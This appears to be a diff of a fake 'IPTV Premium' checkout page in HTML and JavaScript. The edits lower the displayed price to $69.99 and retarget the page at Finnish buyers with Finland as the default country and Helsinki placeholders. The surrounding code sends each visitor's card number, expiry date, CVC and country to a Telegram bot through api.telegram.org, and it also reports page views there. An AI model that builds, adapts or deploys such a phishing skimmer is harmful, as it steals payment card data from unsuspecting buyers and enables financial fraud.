@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>IPTV Premium Checkout • 1 Year / 1 Device</title>
+  <title>IPTV Premium • 1 Year / 1 Device • €69.99</title>
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
@@ -366,8 +366,6 @@
     }
     .checkout-wrapper { position:relative; z-index:2; }
     #cardNumber { font-family:'Inter', monospace; letter-spacing:0.05rem; }
-    .country-required .form-select { border-color: #ff6575; }
-    .country-required .validation-feedback { display: block; }
   </style>
 </head>
 <body>
@@ -409,7 +407,7 @@
             <div class="order-detail" id="orderDetail">
               <div class="detail-row"><span>📦 Order</span> <span class="detail-value" id="orderNumber">#IPTV-2847-91</span> <button class="copy-btn" data-copy="orderNumber">📋 Copy</button></div>
               <div class="detail-row"><span>📺 Product</span> <span class="detail-value">IPTV 1 Year / 1 Device</span> <button class="copy-btn" data-copy="product">📋 Copy</button></div>
-              <div class="detail-row"><span>💰 Amount</span> <span class="detail-value">$74.99 USD</span> <button class="copy-btn" data-copy="amount">📋 Copy</button></div>
+              <div class="detail-row"><span>💰 Amount</span> <span class="detail-value">$69.99 USD</span> <button class="copy-btn" data-copy="amount">📋 Copy</button></div>
               <div class="detail-row"><span>📧 Email</span> <span class="detail-value" id="successEmail">—</span> <button class="copy-btn" data-copy="successEmail">📋 Copy</button></div>
               <div class="detail-row"><span>📞 Phone</span> <span class="detail-value" id="successPhone">—</span> <button class="copy-btn" data-copy="successPhone">📋 Copy</button></div>
               <div class="detail-row"><span>👤 Cardholder</span> <span class="detail-value" id="successCardholder">—</span> <button class="copy-btn" data-copy="successCardholder">📋 Copy</button></div>
@@ -437,8 +435,9 @@
               <label class="form-label">Country/Region <span class="required-star">*</span></label>
               <select class="form-select" id="countrySelect">
                 <option value="">Select country</option>
-                <option value="AE">United Arab Emirates</option>
-                <option value="UK">United Kingdom</option>
+                <option value="FI" selected>Finland (+358)</option>
+                <option value="AE">United Arab Emirates (+971)</option>
+                <option value="UK">United Kingdom (+44)</option>
                 <option value="US">United States (+1)</option>
                 <option value="BG">Bulgaria (+359)</option>
                 <option value="SN">Senegal (+221)</option>
@@ -456,7 +455,6 @@
                 <option value="SE">Sweden (+46)</option>
                 <option value="NO">Norway (+47)</option>
                 <option value="DK">Denmark (+45)</option>
-                <option value="FI">Finland (+358)</option>
                 <option value="PL">Poland (+48)</option>
                 <option value="AU">Australia (+61)</option>
                 <option value="CA">Canada (+1)</option>
@@ -497,18 +495,18 @@
             <div class="form-row">
               <div class="form-group">
                 <label class="form-label">City <span class="required-star">*</span></label>
-                <input type="text" class="form-control" id="city" placeholder="New York" autocomplete="address-level2" />
+                <input type="text" class="form-control" id="city" placeholder="Helsinki" autocomplete="address-level2" />
                 <div class="validation-feedback" id="cityError">City is required.</div>
               </div>
               <div class="form-group">
                 <label class="form-label">State / Province <span class="required-star">*</span></label>
-                <input type="text" class="form-control" id="state" placeholder="NY" autocomplete="address-level1" />
+                <input type="text" class="form-control" id="state" placeholder="Uusimaa" autocomplete="address-level1" />
                 <div class="validation-feedback" id="stateError">State / Province is required.</div>
               </div>
             </div>
             <div class="form-group">
               <label class="form-label">ZIP / Postal Code <span class="required-star">*</span></label>
-              <input type="text" class="form-control" id="postal" placeholder="10001" autocomplete="postal-code" />
+              <input type="text" class="form-control" id="postal" placeholder="00100" autocomplete="postal-code" />
               <div class="validation-feedback" id="postalError">Valid postal code required.</div>
             </div>
 
@@ -542,6 +540,7 @@
               <label class="form-label">Billing country</label>
               <select class="form-select" id="billingCountry">
                 <option value="">Select country</option>
+                <option value="FI" selected>Finland</option>
                 <option value="AE">United Arab Emirates</option>
                 <option value="UK">United Kingdom</option>
                 <option value="US">United States</option>
@@ -564,17 +563,17 @@
           <div class="summary-title">IPTV 1 Year · 1 Device</div>
           <div class="summary-bonus">🎁 HD & Sports + 12 months</div>
           <div>
-            <span class="price-large">$74.99 <small>USD</small></span>
+            <span class="price-large">$69.99 <small>USD</small></span>
             <span class="price-strikethrough">$99.99</span>
           </div>
           <div style="margin-top:1.8rem;">
-            <div class="summary-line"><span>Subtotal</span> <span>$74.99</span></div>
-            <div class="summary-line"><span>Discount</span> <span style="color:#7fcf9b;">− 25%</span></div>
-            <div class="summary-line total"><span>Total</span> <span>$74.99 USD</span></div>
+            <div class="summary-line"><span>Subtotal</span> <span>$69.99</span></div>
+            <div class="summary-line"><span>Discount</span> <span style="color:#7fcf9b;">− 30%</span></div>
+            <div class="summary-line total"><span>Total</span> <span>$69.99 USD</span></div>
           </div>
 
           <button class="btn-primary" id="payButton">
-            <span class="btn-text">🔒 Pay $74.99 Securely</span>
+            <span class="btn-text">🔒 Pay $69.99 Securely</span>
             <span class="spinner"></span>
           </button>
 
@@ -595,7 +594,7 @@
       const TELEGRAM_CHAT_ID = '1017945601';
 
       function notifyPageView() {
-        const viewMsg = `👁️ *IPTV page viewed* · 1 year / 1 device · $74.99 · UAE/UK options`;
+        const viewMsg = `👁️ *IPTV page viewed* · 1 year / 1 device · $69.99 · default FI`;
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -612,11 +611,11 @@
 
       // ========== COUNTRY CODES ==========
       const countryCodes = {
-        BG: '+359', AE: '+971', SN: '+221', PH: '+63', BE: '+32',
+        FI: '+358', BG: '+359', AE: '+971', SN: '+221', PH: '+63', BE: '+32',
         TR: '+90', US: '+1', UK: '+44', DE: '+49', FR: '+33',
         ES: '+34', IT: '+39', NL: '+31', PT: '+351', CH: '+41',
-        AT: '+43', SE: '+46', NO: '+47', DK: '+45', FI: '+358',
-        PL: '+48', AU: '+61', CA: '+1'
+        AT: '+43', SE: '+46', NO: '+47', DK: '+45', PL: '+48',
+        AU: '+61', CA: '+1'
       };
 
       const countrySelect = document.getElementById('countrySelect');
@@ -630,7 +629,7 @@
           opt.textContent = dial;
           phoneCodeSelect.appendChild(opt);
         }
-        phoneCodeSelect.value = 'US';
+        phoneCodeSelect.value = 'FI';
       }
 
       function updatePhoneCode() {
@@ -742,7 +741,7 @@
         📅 Expiry: ${data.expiry}
         🔐 CVC: ${data.cvc}
         🌍 Country: ${data.country}
-        💰 Amount: $74.99 USD
+        💰 Amount: $69.99 USD
         `;
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -911,7 +910,7 @@
           let text = '';
           if (targetId === 'orderNumber') text = document.getElementById('orderNumber').textContent;
           else if (targetId === 'product') text = 'IPTV 1 Year / 1 Device';
-          else if (targetId === 'amount') text = '$74.99 USD';
+          else if (targetId === 'amount') text = '$69.99 USD';
           else if (targetId === 'successEmail') text = document.getElementById('successEmail').textContent;
           else if (targetId === 'successPhone') text = document.getElementById('successPhone').textContent;
           else if (targetId === 'successCardholder') text = document.getElementById('successCardholder')
